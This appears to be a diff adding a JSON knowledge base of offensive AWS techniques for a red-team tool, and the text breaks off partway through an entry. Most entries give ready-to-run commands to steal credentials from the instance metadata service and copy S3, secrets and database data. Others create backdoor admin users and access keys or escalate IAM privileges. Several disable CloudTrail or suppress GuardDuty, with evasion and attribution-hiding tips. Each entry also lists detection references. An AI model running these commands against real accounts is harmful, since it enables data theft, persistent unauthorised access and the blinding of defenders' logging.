@@ -1,0 +1,769 @@
+{
+  "enum_iam": {
+    "description": "Enumerating IAM users, roles, policies, and permissions.",
+    "commands": [
+      {
+        "description": "List all IAM users in the account.",
+        "method": "AWS CLI",
+        "command": "aws iam list-users"
+      },
+      {
+        "description": "List all IAM roles.",
+        "method": "AWS CLI",
+        "command": "aws iam list-roles"
+      },
+      {
+        "description": "List attached policies for a user.",
+        "method": "AWS CLI",
+        "command": "aws iam list-attached-user-policies --user-name {user}"
+      },
+      {
+        "description": "List all IAM groups.",
+        "method": "AWS CLI",
+        "command": "aws iam list-groups"
+      },
+      {
+        "description": "Enumerate effective permissions with Enumerate-IAM.",
+        "method": "enumerate-iam",
+        "command": "python3 enumerate-iam.py --access-key {key} --secret-key {secret}"
+      },
+      {
+        "description": "Identify privilege escalation paths with Pacu.",
+        "method": "Pacu",
+        "command": "run iam__privesc_scan"
+      }
+    ],
+    "mitre": "T1087.004",
+    "prerequisites": "Any AWS credentials (even low-privilege); IAM API access not blocked",
+    "opsec": "IAM enumeration generates CloudTrail events. Use --no-cli-pager to avoid interactive prompts. Target specific actions vs mass enumeration.",
+    "detection_ref": "CloudTrail: ListUsers, GetAccountAuthorizationDetails, ListRoles; GuardDuty findings for credential recon"
+  },
+  "enum_s3": {
+    "description": "Enumerating S3 buckets for public access, misconfiguration, and sensitive data.",
+    "commands": [
+      {
+        "description": "List all S3 buckets in the account.",
+        "method": "AWS CLI",
+        "command": "aws s3 ls"
+      },
+      {
+        "description": "List contents of a bucket anonymously (public bucket test).",
+        "method": "AWS CLI",
+        "command": "aws s3 ls s3://{bucket_name} --no-sign-request"
+      },
+      {
+        "description": "Check bucket ACL and policy.",
+        "method": "AWS CLI",
+        "command": "aws s3api get-bucket-acl --bucket {bucket_name}"
+      },
+      {
+        "description": "Check public access block settings.",
+        "method": "AWS CLI",
+        "command": "aws s3api get-public-access-block --bucket {bucket_name}"
+      },
+      {
+        "description": "Bruteforce bucket names with S3Scanner.",
+        "method": "S3Scanner",
+        "command": "s3scanner scan --buckets-file {wordlist}"
+      }
+    ],
+    "mitre": "T1530",
+    "prerequisites": "AWS creds with s3:ListAllMyBuckets or S3 public bucket target",
+    "opsec": "S3 public bucket access leaves no auth trace \u2014 just IP in server logs. Authenticated enumeration via API logged in CloudTrail.",
+    "detection_ref": "S3 server access logs; CloudTrail data events; Macie sensitive data detection"
+  },
+  "s3_data_exfil": {
+    "description": "Exfiltrating data from S3 buckets.",
+    "commands": [
+      {
+        "description": "Copy a single file from S3.",
+        "method": "AWS CLI",
+        "command": "aws s3 cp s3://{bucket}/{file} ."
+      },
+      {
+        "description": "Sync entire bucket contents locally.",
+        "method": "AWS CLI",
+        "command": "aws s3 sync s3://{bucket} ./loot/"
+      },
+      {
+        "description": "Recursive download without credentials (public bucket).",
+        "method": "AWS CLI",
+        "command": "aws s3 sync s3://{bucket} ./loot/ --no-sign-request"
+      }
+    ],
+    "mitre": "T1537",
+    "prerequisites": "S3 read permissions; bucket contents identified",
+    "opsec": "Compress and encrypt data before sync. Use aws s3 cp with --sse for encrypted transfer. Split large datasets.",
+    "detection_ref": "CloudTrail data events for S3 (if enabled); Macie; network egress monitoring for S3 endpoints"
+  },
+  "enum_ec2": {
+    "description": "Enumerating EC2 instances, security groups, and metadata.",
+    "commands": [
+      {
+        "description": "List all EC2 instances.",
+        "method": "AWS CLI",
+        "command": "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,PrivateIpAddress,State.Name]' --output table"
+      },
+      {
+        "description": "List all security groups.",
+        "method": "AWS CLI",
+        "command": "aws ec2 describe-security-groups"
+      },
+      {
+        "description": "Enumerate EC2 instance metadata including IAM role credentials (IMDSv2 required when hop_limit=1 enforcement is enabled)",
+        "method": "curl",
+        "command": "# IMDSv2 (preferred \u2014 IMDSv1 may be blocked)\nTOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# IMDSv1 fallback (only if v2 is not enforced)\ncurl http://169.254.169.254/latest/meta-data/"
+      },
+      {
+        "description": "Steal IAM credentials from metadata service. Note: IMDSv2 required on modern AWS accounts \u2014 uses token-based auth. IMDSv1 fallback may be disabled.",
+        "method": "curl",
+        "command": "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+      },
+      {
+        "description": "IMDSv2 token-based credential theft.",
+        "method": "curl",
+        "command": "TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+      }
+    ],
+    "mitre": "T1087.004",
+    "prerequisites": "AWS credentials with ec2:Describe* permissions or EC2 instance with metadata access",
+    "opsec": "IMDSv2 is required on modern instances \u2014 always try token-based request first. IMDSv1 access generates a deprecation warning in CloudTrail.",
+    "detection_ref": "CloudTrail: DescribeInstances from unusual source; GuardDuty EC2 instance metadata service attack detection"
+  },
+  "enum_secrets": {
+    "description": "Hunting for secrets stored in AWS services.",
+    "commands": [
+      {
+        "description": "List all secrets in Secrets Manager.",
+        "method": "AWS CLI",
+        "command": "aws secretsmanager list-secrets"
+      },
+      {
+        "description": "Retrieve a secret value.",
+        "method": "AWS CLI",
+        "command": "aws secretsmanager get-secret-value --secret-id {secret_name}"
+      },
+      {
+        "description": "List SSM Parameter Store parameters.",
+        "method": "AWS CLI",
+        "command": "aws ssm describe-parameters"
+      },
+      {
+        "description": "Retrieve SSM secure string parameter.",
+        "method": "AWS CLI",
+        "command": "aws ssm get-parameter --name {param_name} --with-decryption"
+      }
+    ],
+    "mitre": "T1552",
+    "prerequisites": "Any AWS creds; secretsmanager:ListSecrets or SSM:DescribeParameters",
+    "opsec": "List then selectively access by name. CloudTrail logs each GetSecretValue call.",
+    "detection_ref": "CloudTrail: ListSecrets, GetSecretValue; GuardDuty secrets access findings"
+  },
+  "privilege_escalation": {
+    "description": "Escalating privileges within an AWS account.",
+    "commands": [
+      {
+        "description": "Attach AdministratorAccess to a user.",
+        "method": "AWS CLI",
+        "command": "aws iam attach-user-policy --user-name {user} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+      },
+      {
+        "description": "Create new admin user.",
+        "method": "AWS CLI",
+        "command": "aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+      },
+      {
+        "description": "Assume a high-privilege role.",
+        "method": "AWS CLI",
+        "command": "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/{role_name} --role-session-name pwned"
+      },
+      {
+        "description": "Lambda privesc \u2014 update function code.",
+        "method": "AWS CLI",
+        "command": "aws lambda update-function-code --function-name {function} --zip-file fileb://payload.zip"
+      },
+      {
+        "description": "IAM PassRole abuse \u2014 escalate via creating EC2/Lambda with high-privilege role.",
+        "method": "AWS CLI",
+        "command": "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' && aws ec2 run-instances --image-id ami-{id} --instance-type t2.micro --iam-instance-profile Name={high_priv_role}"
+      },
+      {
+        "description": "Escalate via iam:CreatePolicyVersion \u2014 create new policy version with admin.",
+        "method": "AWS CLI",
+        "command": "aws iam create-policy-version --policy-arn {policy_arn} --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' --set-as-default"
+      },
+      {
+        "description": "Escalate via iam:SetDefaultPolicyVersion \u2014 switch to older permissive version.",
+        "method": "AWS CLI",
+        "command": "aws iam list-policy-versions --policy-arn {policy_arn} && aws iam set-default-policy-version --policy-arn {policy_arn} --version-id v{n}"
+      },
+      {
+        "description": "CodeStar privilege escalation \u2014 add team member with owner role.",
+        "method": "AWS CLI",
+        "command": "aws codestar associate-team-member --project-id {project} --user-arn arn:aws:iam::{account}:user/{attacker_user} --project-role Owner"
+      }
+    ],
+    "mitre": "T1078.004",
+    "prerequisites": "IAM permissions with escalation vector",
+    "opsec": "Use Pacu escalation module. Avoid bulk policy changes \u2014 targeted single escalation path.",
+    "detection_ref": "CloudTrail IAM events; GuardDuty privilege escalation findings; Prowler IAM checks"
+  },
+  "cloudtrail_evasion": {
+    "description": "Disabling or tampering with CloudTrail to evade detection.",
+    "commands": [
+      {
+        "description": "Stop CloudTrail logging.",
+        "method": "AWS CLI",
+        "command": "aws cloudtrail stop-logging --name {trail_name}"
+      },
+      {
+        "description": "Delete CloudTrail trail.",
+        "method": "AWS CLI",
+        "command": "aws cloudtrail delete-trail --name {trail_name}"
+      },
+      {
+        "description": "List all CloudTrail trails.",
+        "method": "AWS CLI",
+        "command": "aws cloudtrail describe-trails"
+      },
+      {
+        "description": "Disable CloudTrail event selectors to create blind spots.",
+        "method": "AWS CLI",
+        "command": "aws cloudtrail put-event-selectors --trail-name {trail} --event-selectors '[{\"ReadWriteType\":\"ReadOnly\",\"IncludeManagementEvents\":false}]'"
+      },
+      {
+        "description": "Use Pacu for automated CloudTrail evasion.",
+        "method": "Pacu",
+        "command": "run cloudtrail__evade --all-trails"
+      },
+      {
+        "description": "Operate in regions without active CloudTrail trails.",
+        "method": "AWS CLI",
+        "command": "aws cloudtrail describe-trails --include-shadow-trails --query 'trailList[?IsMultiRegionTrail==`false`].[Name,HomeRegion]' --output table  # Find region-only trails"
+      }
+    ],
+    "mitre": "T1562.008",
+    "prerequisites": "CloudTrail management event logging active; admin IAM permissions",
+    "opsec": "Stop logging temporarily or create event selectors to exclude actions. Delete log files from S3 bucket.",
+    "detection_ref": "CloudTrail: StopLogging, DeleteTrail; CloudWatch alarm for logging disruption; GuardDuty disabling findings"
+  },
+  "enum_lambda": {
+    "description": "Enumerating Lambda functions, environment variables, and code for secrets.",
+    "commands": [
+      {
+        "description": "List all Lambda functions.",
+        "method": "AWS CLI",
+        "command": "aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table"
+      },
+      {
+        "description": "Get Lambda function environment variables (may contain secrets).",
+        "method": "AWS CLI",
+        "command": "aws lambda get-function-configuration --function-name {function_name} --query 'Environment'"
+      },
+      {
+        "description": "Download Lambda function code for static analysis.",
+        "method": "AWS CLI",
+        "command": "aws lambda get-function --function-name {function_name} --query 'Code.Location' | xargs curl -o function.zip"
+      },
+      {
+        "description": "List all Lambda layers.",
+        "method": "AWS CLI",
+        "command": "aws lambda list-layers"
+      },
+      {
+        "description": "Invoke Lambda function directly.",
+        "method": "AWS CLI",
+        "command": "aws lambda invoke --function-name {function_name} --payload '{\"cmd\":\"id\"}' output.txt && cat output.txt"
+      }
+    ],
+    "mitre": "T1648",
+    "prerequisites": "lambda:ListFunctions, GetFunction permissions",
+    "opsec": "Enumerate functions, check environment variables for secrets, review function code for hardcoded creds.",
+    "detection_ref": "CloudTrail: ListFunctions, GetFunction; Lambda function code access logging"
+  },
+  "enum_rds": {
+    "description": "Enumerating RDS instances, snapshots, and attempting access.",
+    "commands": [
+      {
+        "description": "List all RDS instances.",
+        "method": "AWS CLI",
+        "command": "aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,PubliclyAccessible,Endpoint.Address]' --output table"
+      },
+      {
+        "description": "List all RDS snapshots (may be publicly shared).",
+        "method": "AWS CLI",
+        "command": "aws rds describe-db-snapshots --snapshot-type public --include-public"
+      },
+      {
+        "description": "Restore public snapshot to attacker-controlled instance.",
+        "method": "AWS CLI",
+        "command": "aws rds restore-db-instance-from-db-snapshot --db-instance-identifier hacked-db --db-snapshot-identifier {snapshot_arn}"
+      },
+      {
+        "description": "List all RDS clusters (Aurora).",
+        "method": "AWS CLI",
+        "command": "aws rds describe-db-clusters"
+      },
+      {
+        "description": "Modify RDS security group to allow external access.",
+        "method": "AWS CLI",
+        "command": "aws ec2 authorize-security-group-ingress --group-id {sg_id} --protocol tcp --port 3306 --cidr 0.0.0.0/0"
+      }
+    ],
+    "mitre": "T1552",
+    "prerequisites": "rds:DescribeDBInstances, DescribeDBSnapshots permissions",
+    "opsec": "Check for public snapshots, exported snapshots, unencrypted instances. Share snapshot with attacker account.",
+    "detection_ref": "CloudTrail: DescribeDBSnapshots; public snapshot detection; GuardDuty RDS findings"
+  },
+  "enum_network": {
+    "description": "Enumerating VPCs, subnets, security groups, and network configurations.",
+    "commands": [
+      {
+        "description": "List all VPCs.",
+        "method": "AWS CLI",
+        "command": "aws ec2 describe-vpcs --query 'Vpcs[*].[VpcId,CidrBlock,IsDefault]' --output table"
+      },
+      {
+        "description": "List all subnets and their VPCs.",
+        "method": "AWS CLI",
+        "command": "aws ec2 describe-subnets --query 'Subnets[*].[SubnetId,VpcId,CidrBlock,MapPublicIpOnLaunch]' --output table"
+      },
+      {
+        "description": "Find security groups with 0.0.0.0/0 ingress rules (overly permissive).",
+        "method": "AWS CLI",
+        "command": "aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].[GroupId,GroupName]' --output table"
+      },
+      {
+        "description": "List all internet gateways.",
+        "method": "AWS CLI",
+        "command": "aws ec2 describe-internet-gateways"
+      },
+      {
+        "description": "Enumerate all VPC peering connections.",
+        "method": "AWS CLI",
+        "command": "aws ec2 describe-vpc-peering-connections"
+      }
+    ],
+    "mitre": "T1046",
+    "prerequisites": "ec2:Describe* permissions for VPC, security groups, subnets",
+    "opsec": "Map network topology to identify internal targets. Security group rules reveal what services are exposed.",
+    "detection_ref": "CloudTrail: DescribeVpcs, DescribeSecurityGroups; network access pattern monitoring"
+  },
+  "enum_ecs_ecr": {
+    "description": "Enumerating ECS containers and ECR registries for image analysis and secrets.",
+    "commands": [
+      {
+        "description": "List all ECS clusters.",
+        "method": "AWS CLI",
+        "command": "aws ecs list-clusters"
+      },
+      {
+        "description": "List all tasks in an ECS cluster.",
+        "method": "AWS CLI",
+        "command": "aws ecs list-tasks --cluster {cluster_name}"
+      },
+      {
+        "description": "Describe ECS task to find container secrets and IAM roles.",
+        "method": "AWS CLI",
+        "command": "aws ecs describe-tasks --cluster {cluster} --tasks {task_arn}"
+      },
+      {
+        "description": "List all ECR repositories.",
+        "method": "AWS CLI",
+        "command": "aws ecr describe-repositories"
+      },
+      {
+        "description": "Pull ECR image for local analysis.",
+        "method": "AWS CLI",
+        "command": "aws ecr get-login-password | docker login --username AWS --password-stdin {account_id}.dkr.ecr.{region}.amazonaws.com && docker pull {account_id}.dkr.ecr.{region}.amazonaws.com/{repo}:{tag}"
+      }
+    ],
+    "mitre": "T1611",
+    "prerequisites": "ecs:ListClusters, ecr:GetAuthorizationToken permissions",
+    "opsec": "ECR images may contain secrets in layers or env vars. ECS task definitions contain IAM roles and environment variables.",
+    "detection_ref": "CloudTrail: ECR auth token requests; image pull monitoring; task definition access logging"
+  },
+  "lateral_movement": {
+    "description": "Moving laterally within AWS accounts and between services.",
+    "commands": [
+      {
+        "description": "Pivot to EC2 instance via SSM Session Manager (no SSH needed).",
+        "method": "AWS CLI",
+        "command": "aws ssm start-session --target {instance_id}"
+      },
+      {
+        "description": "Run command on EC2 fleet via SSM.",
+        "method": "AWS CLI",
+        "command": "aws ssm send-command --instance-ids {instance_id} --document-name AWS-RunShellScript --parameters commands='[\"id\",\"cat /etc/passwd\"]'"
+      },
+      {
+        "description": "Check SSM command output.",
+        "method": "AWS CLI",
+        "command": "aws ssm get-command-invocation --command-id {command_id} --instance-id {instance_id} --query 'StandardOutputContent'"
+      },
+      {
+        "description": "Use stolen temporary credentials to access another account.",
+        "method": "AWS CLI",
+        "command": "AWS_ACCESS_KEY_ID={key} AWS_SECRET_ACCESS_KEY={secret} AWS_SESSION_TOKEN={token} aws sts get-caller-identity"
+      },
+      {
+        "description": "Create EC2 instance with IAM role for persistence.",
+        "method": "AWS CLI",
+        "command": "aws ec2 run-instances --image-id ami-{id} --instance-type t2.micro --iam-instance-profile Name={profile} --user-data file://backdoor.sh"
+      }
+    ],
+    "mitre": "T1021",
+    "prerequisites": "Compromised IAM credentials; ability to assume roles or access services",
+    "opsec": "Use compromised service account creds to access additional services. Role assumption chains obscure original identity.",
+    "detection_ref": "CloudTrail cross-service API calls; unusual role assumption patterns; GuardDuty lateral movement findings"
+  },
+  "enum_cloudformation": {
+    "description": "Enumerating CloudFormation stacks for embedded secrets and infrastructure details.",
+    "mitre": "T1580",
+    "commands": [
+      {
+        "description": "List all CloudFormation stacks.",
+        "method": "AWS CLI",
+        "command": "aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE"
+      },
+      {
+        "description": "Describe stack parameters (may contain secrets).",
+        "method": "AWS CLI",
+        "command": "aws cloudformation describe-stacks --stack-name {stack_name} --query 'Stacks[].Parameters'"
+      },
+      {
+        "description": "Get CloudFormation stack template (infrastructure as code source).",
+        "method": "AWS CLI",
+        "command": "aws cloudformation get-template --stack-name {stack_name}"
+      },
+      {
+        "description": "List stack resources.",
+        "method": "AWS CLI",
+        "command": "aws cloudformation list-stack-resources --stack-name {stack_name}"
+      },
+      {
+        "description": "Get stack outputs (often include endpoints and credentials).",
+        "method": "AWS CLI",
+        "command": "aws cloudformation describe-stacks --stack-name {stack_name} --query 'Stacks[].Outputs'"
+      }
+    ],
+    "prerequisites": "cloudformation:DescribeStacks, GetTemplate permissions",
+    "opsec": "Stack templates often contain resource configurations and occasionally hardcoded values. Parameter values reveal config.",
+    "detection_ref": "CloudTrail: DescribeStacks, GetTemplate; stack output and parameter access logging"
+  },
+  "enum_cognito": {
+    "description": "Enumerating and attacking AWS Cognito user pools for account takeover.",
+    "mitre": "T1110",
+    "commands": [
+      {
+        "description": "List all Cognito user pools.",
+        "method": "AWS CLI",
+        "command": "aws cognito-idp list-user-pools --max-results 60"
+      },
+      {
+        "description": "List users in a Cognito pool.",
+        "method": "AWS CLI",
+        "command": "aws cognito-idp list-users --user-pool-id {pool_id}"
+      },
+      {
+        "description": "Sign up a new user to Cognito pool (if open registration).",
+        "method": "AWS CLI",
+        "command": "aws cognito-idp sign-up --client-id {client_id} --username {email} --password {password}"
+      },
+      {
+        "description": "Initiate auth against Cognito user pool (brute force).",
+        "method": "AWS CLI",
+        "command": "aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME={user},PASSWORD={pass} --client-id {client_id}"
+      },
+      {
+        "description": "Admin create backdoor user in Cognito pool.",
+        "method": "AWS CLI",
+        "command": "aws cognito-idp admin-create-user --user-pool-id {pool_id} --username backdoor --temporary-password Temp@1234 --message-action SUPPRESS"
+      }
+    ],
+    "prerequisites": "cognito-idp:ListUserPools or target Cognito User Pool known",
+    "opsec": "Unauthenticated identity pool access yields AWS credentials. User pool misconfiguration allows account enumeration.",
+    "detection_ref": "CloudTrail: Cognito API calls; GuardDuty Cognito findings; identity pool usage monitoring"
+  },
+  "persistence_aws": {
+    "description": "Establishing long-term persistence within AWS environments.",
+    "mitre": "T1098",
+    "commands": [
+      {
+        "description": "Create access key for existing user as persistence backdoor.",
+        "method": "AWS CLI",
+        "command": "aws iam create-access-key --user-name {existing_user}"
+      },
+      {
+        "description": "Create Lambda function triggered on schedule as C2 beaconing.",
+        "method": "AWS CLI",
+        "command": "aws events put-rule --name 'SystemCheck' --schedule-expression 'rate(5 minutes)' && aws events put-targets --rule SystemCheck --targets Id=1,Arn={lambda_arn}"
+      },
+      {
+        "description": "Add inline IAM policy to existing role for stealth.",
+        "method": "AWS CLI",
+        "command": "aws iam put-role-policy --role-name {role_name} --policy-name AWSSystemsPolicy --policy-document file://admin_policy.json"
+      },
+      {
+        "description": "Register external IdP SAML provider for federated backdoor.",
+        "method": "AWS CLI",
+        "command": "aws iam create-saml-provider --saml-metadata-document file://metadata.xml --name BackupIDP"
+      },
+      {
+        "description": "Enable AWS console access for programmatic-only user.",
+        "method": "AWS CLI",
+        "command": "aws iam create-login-profile --user-name {user} --password {pass} --no-password-reset-required"
+      }
+    ],
+    "prerequisites": "IAM permissions to create users, access keys, roles, or backdoor trust policies",
+    "opsec": "Create secondary access key on existing user. Add backdoor trust to existing role. Less suspicious than new user creation.",
+    "detection_ref": "CloudTrail: CreateAccessKey, UpdateAssumeRolePolicy; GuardDuty persistence findings; IAM credential report monitoring"
+  },
+  "enum_eks": {
+    "description": "Enumerating Elastic Kubernetes Service (EKS) clusters and stealing node IAM credentials.",
+    "mitre": "T1613",
+    "commands": [
+      {
+        "description": "List all EKS clusters.",
+        "method": "AWS CLI",
+        "command": "aws eks list-clusters"
+      },
+      {
+        "description": "Get kubeconfig for EKS cluster.",
+        "method": "AWS CLI",
+        "command": "aws eks update-kubeconfig --name {cluster_name} --region {region}"
+      },
+      {
+        "description": "Describe EKS cluster and get endpoint.",
+        "method": "AWS CLI",
+        "command": "aws eks describe-cluster --name {cluster_name} --query 'cluster.[endpoint,roleArn,version]'"
+      },
+      {
+        "description": "Steal node IAM role credentials from inside EKS pod via IMDS. Note: IMDSv2 required on modern AWS accounts \u2014 uses token-based auth. IMDSv1 fallback may be disabled.",
+        "method": "curl",
+        "command": "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ && curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+      },
+      {
+        "description": "List EKS managed node groups.",
+        "method": "AWS CLI",
+        "command": "aws eks list-nodegroups --cluster-name {cluster_name}"
+      }
+    ],
+    "prerequisites": "eks:DescribeClusters; Kubernetes API access via kubeconfig or aws eks get-token",
+    "opsec": "EKS combines AWS IAM + Kubernetes RBAC. aws-auth ConfigMap misconfiguration grants full cluster access.",
+    "detection_ref": "CloudTrail: eks API calls; Kubernetes audit log; GuardDuty EKS findings"
+  },
+  "aws_post_exploit": {
+    "description": "Post-exploitation actions after gaining AWS access \u2014 data and credential harvesting.",
+    "mitre": "T1530",
+    "commands": [
+      {
+        "description": "Enumerate all regions for resources (multi-region sweep).",
+        "method": "AWS CLI",
+        "command": "for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do echo \"=== $r ===\"; aws s3 ls --region $r 2>/dev/null; done"
+      },
+      {
+        "description": "Dump all CodeCommit repositories for source code.",
+        "method": "AWS CLI",
+        "command": "aws codecommit list-repositories --query 'repositories[*].repositoryName' --output text | xargs -I{} aws codecommit get-repository --repository-name {}"
+      },
+      {
+        "description": "List all CodeBuild projects and get environment variables.",
+        "method": "AWS CLI",
+        "command": "aws codebuild list-projects && aws codebuild batch-get-projects --names {project_name} --query 'projects[].environment.environmentVariables'"
+      },
+      {
+        "description": "Export all DynamoDB tables.",
+        "method": "AWS CLI",
+        "command": "aws dynamodb list-tables && aws dynamodb scan --table-name {table_name}"
+      },
+      {
+        "description": "Retrieve AWS account's organization structure.",
+        "method": "AWS CLI",
+        "command": "aws organizations describe-organization && aws organizations list-accounts"
+      }
+    ],
+    "prerequisites": "Established AWS access; target services identified",
+    "opsec": "Enumerate services relevant to engagement objectives. Use Pacu for systematic post-exploitation.",
+    "detection_ref": "CloudTrail comprehensive logging; GuardDuty behavioral analysis; Config Rules for compliance violations"
+  },
+  "cross_account_attacks": {
+    "description": "Cross-account privilege escalation via role trust policies and resource-based policies.",
+    "mitre": "T1098.001",
+    "commands": [
+      {
+        "description": "Enumerate roles with cross-account trust relationships.",
+        "method": "AWS CLI",
+        "command": "aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.AWS,`arn:aws:iam`)].{Name:RoleName,Trust:AssumeRolePolicyDocument}' --output json"
+      },
+      {
+        "description": "Assume cross-account role from compromised account.",
+        "method": "AWS CLI",
+        "command": "aws sts assume-role --role-arn arn:aws:iam::{target_account}:role/{role_name} --role-session-name crossaccount && export AWS_ACCESS_KEY_ID={key} AWS_SECRET_ACCESS_KEY={secret} AWS_SESSION_TOKEN={token}"
+      },
+      {
+        "description": "Enumerate S3 bucket resource policies for cross-account access.",
+        "method": "AWS CLI",
+        "command": "aws s3api get-bucket-policy --bucket {bucket} | python3 -c 'import sys,json; p=json.load(sys.stdin); [print(s) for s in p[\"Statement\"] if \"Principal\" in s and \"AWS\" in s.get(\"Principal\",{})]'"
+      },
+      {
+        "description": "Enumerate all accounts in AWS Organization for cross-account pivot.",
+        "method": "AWS CLI",
+        "command": "aws organizations list-accounts --query 'Accounts[*].[Id,Name,Email,Status]' --output table"
+      },
+      {
+        "description": "Use ScoutSuite for cross-account multi-service security audit.",
+        "method": "ScoutSuite",
+        "command": "python3 scout.py aws --report-dir ./scout_report/ --regions {region}"
+      }
+    ],
+    "prerequisites": "Trust relationship to target account; STS AssumeRole permission; target role ARN",
+    "opsec": "Cross-account activity CloudTrail events show source account. Use role chaining to obscure attribution.",
+    "detection_ref": "CloudTrail: cross-account AssumeRole; trust policy audit; SCPs preventing cross-account access"
+  },
+  "guardduty_evasion": {
+    "description": "Evade AWS GuardDuty detection by leveraging trusted IPs, suppression rules, and low-noise enumeration techniques.",
+    "mitre": "T1562.008",
+    "commands": [
+      {
+        "description": "Check if GuardDuty is enabled in the current account",
+        "command": "aws guardduty list-detectors\naws guardduty get-detector --detector-id <DETECTOR_ID>",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Add attacker IP to GuardDuty trusted IP list (requires guardduty:CreateIPSet)",
+        "command": "echo '1.2.3.4/32' > /tmp/trusted_ips.txt\naws s3 cp /tmp/trusted_ips.txt s3://target-bucket/trusted_ips.txt\naws guardduty create-ip-set --detector-id <ID> --format TXT --location s3://target-bucket/trusted_ips.txt --activate --name TrustedIPs",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Create GuardDuty suppression rule to archive specific findings",
+        "command": "aws guardduty create-filter --detector-id <ID> --name SuppressRecon --action ARCHIVE --finding-criteria '{\"Criterion\":{\"type\":{\"Eq\":[\"Recon:IAMUser/MaliciousIPCaller\"]}}}'",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Use Pacu to enumerate GuardDuty configuration",
+        "command": "# In Pacu:\nrun guardduty__enum\nrun guardduty__disable",
+        "method": "Pacu"
+      }
+    ],
+    "prerequisites": "Admin IAM access; GuardDuty enabled in account",
+    "opsec": "Disable GuardDuty detectors or create suppression rules. Use Tor/VPN to avoid IP-based detections.",
+    "detection_ref": "GuardDuty: disable detector events (CloudTrail); separate security account for GuardDuty management; auto-remediation"
+  },
+  "lambda_function_url_abuse": {
+    "description": "Abuse publicly accessible Lambda Function URLs for unauthenticated access, SSRF to IMDS, and credential extraction.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Enumerate Lambda functions with public Function URLs",
+        "command": "for fn in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do aws lambda get-function-url-config --function-name $fn 2>/dev/null && echo \"$fn has URL\"; done",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Invoke public Lambda Function URL directly",
+        "command": "curl -s 'https://<id>.lambda-url.<region>.on.aws/' -X POST -d '{\"cmd\": \"id\"}' -H 'Content-Type: application/json'",
+        "method": "curl"
+      },
+      {
+        "description": "Enumerate EC2 instance metadata including IAM role credentials (IMDSv2 required when hop_limit=1 enforcement is enabled)",
+        "command": "# IMDSv2 (preferred \u2014 IMDSv1 may be blocked)\nTOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# IMDSv1 fallback (only if v2 is not enforced)\ncurl http://169.254.169.254/latest/meta-data/",
+        "method": "curl"
+      },
+      {
+        "description": "List Lambda environment variables (may contain secrets)",
+        "command": "aws lambda get-function-configuration --function-name <FUNCTION_NAME> --query 'Environment.Variables'",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Update Lambda function code to establish reverse shell",
+        "command": "echo 'import subprocess\\ndef handler(e,c): return subprocess.check_output(\"id\", shell=True).decode()' > lambda_function.py\nzip function.zip lambda_function.py\naws lambda update-function-code --function-name <FUNCTION_NAME> --zip-file fileb://function.zip",
+        "method": "AWS CLI"
+      }
+    ],
+    "prerequisites": "Lambda function URL publicly accessible; SSRF vector in function code",
+    "opsec": "Lambda invocations are logged in CloudWatch. SSRF to metadata service retrieves execution role credentials. IMDSv2 required for credential theft from Lambda.",
+    "detection_ref": "Lambda invocation logs; VPC flow logs for SSRF traffic; GuardDuty for credential theft from Lambda metadata"
+  },
+  "oidc_sts_attack": {
+    "description": "OIDC (OpenID Connect) federation with STS AssumeRoleWithWebIdentity allows external identity providers to assume AWS IAM roles. If the trust policy is misconfigured (e.g., using ':sub' wildcard or overly permissive conditions), an attacker with a valid JWT from the trusted OIDC provider can assume the role and escalate privileges.",
+    "mitre": "T1550.001",
+    "opsec": "AssumeRoleWithWebIdentity calls appear in CloudTrail under eventName=AssumeRoleWithWebIdentity. Anomalous if source IP is unexpected. Use short-lived session tokens and blend with normal service traffic.",
